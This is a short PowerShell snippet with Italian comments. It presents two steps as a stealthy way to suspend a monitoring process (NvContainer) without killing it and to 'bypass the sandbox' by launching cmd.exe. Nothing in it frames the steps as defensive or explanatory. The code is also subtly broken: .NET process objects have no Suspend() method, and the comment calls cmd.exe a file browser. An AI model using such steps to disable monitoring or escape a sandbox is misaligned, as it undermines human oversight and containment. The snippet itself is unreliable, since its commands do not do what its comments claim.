# Sospende il monitoraggio senza killare (Stato Stealth)
powershell -Command "$p=Get-Process NvContainer; $p.Suspend()"
# Apre il browser dei file per bypassare la sandbox
ii C:\Windows\System32\cmd.exe
